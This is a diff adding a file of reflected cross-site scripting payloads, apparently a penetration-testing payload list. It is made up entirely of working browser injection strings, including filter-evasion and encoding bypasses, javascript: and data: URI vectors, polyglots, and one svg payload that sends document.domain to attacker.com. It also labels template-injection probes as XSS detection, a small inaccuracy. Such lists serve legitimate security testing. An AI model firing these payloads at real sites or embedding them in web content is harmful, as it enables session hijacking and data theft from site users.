@@ -1,0 +1,78 @@
+# Cross-Site Scripting (XSS) - Reflected
+# Basic payloads (detection)
+<script>alert('XSS')</script>
+<img src=x onerror="alert('XSS')">
+<svg onload="alert('XSS')">
+"><script>alert('XSS')</script>
+'><script>alert('XSS')</script>
+
+# Event handler variations
+<img src=x onerror=alert('XSS')>
+<img src=x onerror="eval(atob('YWxlcnQoJ1hTUycpOw=='))">
+<body onload=alert('XSS')>
+<input onfocus=alert('XSS') autofocus>
+<marquee onstart=alert('XSS')>
+<div onmouseover=alert('XSS')>
+
+# SVG-based XSS
+<svg/onload=alert('XSS')>
+<svg onload=fetch('http://attacker.com/?'+ document.domain)>
+<svg><script>alert('XSS')</script></svg>
+<svg><animate attributeName=onclick values="alert('XSS')" begin="0"/>
+
+# HTML5 attributes
+<video src=x onerror=alert('XSS')>
+<audio src=x onerror=alert('XSS')>
+<iframe onload=alert('XSS')>
+<object data=x onerror=alert('XSS')>
+
+# Event handler bypass (filter evasion)
+<img SrC=x onerror="alert('XSS')">
+<img src=x OnErRoR="alert('XSS')">
+<img src=x onerror="alert(String.fromCharCode(88,83,83))">
+<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))">
+
+# Encoding bypass variants
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">
+<img src=x onerror="%61%6c%65%72%74%28%27%58%53%53%27%29">
+<img src=x onerror="\u0061lert('XSS')">
+<img src=x onerror="\x61lert('XSS')">
+
+# JavaScript protocol
+<a href="javascript:alert('XSS')">click</a>
+<a href="javascript:void(0)" onclick="alert('XSS')">click</a>
+<iframe src="javascript:alert('XSS')"></iframe>
+<form action="javascript:alert('XSS')">
+
+# Data URI payload
+<a href="data:text/html,<script>alert('XSS')</script>">click</a>
+<img src="data:text/html,<script>alert('XSS')</script>">
+
+# Filter bypass with null bytes
+<img src=x onerror="alert%00('XSS')">
+<script>alert('XSS')</script%00>
+
+# CDATA bypass (XML contexts)
+<![CDATA[<img src=x onerror=alert('XSS')>]]>
+
+# Comment bypass
+<!--><img src=x onerror=alert('XSS')>
+
+# Case and whitespace bypass
+<ScRiPt>alert('XSS')</sCrIpT>
+<script   >alert('XSS')</script>
+<script
+>alert('XSS')</script>
+
+# Template injection style
+{{7*7}} - XSS detection
+${7*7} - XSS detection
+<%= 7*7 %> - XSS detection
+
+# Form-based XSS
+<form><button formaction="javascript:alert('XSS')">
+<input onfocus=alert('XSS') autofocus>
+
+# Polyglot (multi-context)
+jaVasCript:/**/alert(String.fromCharCode(88,83,83))
+data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
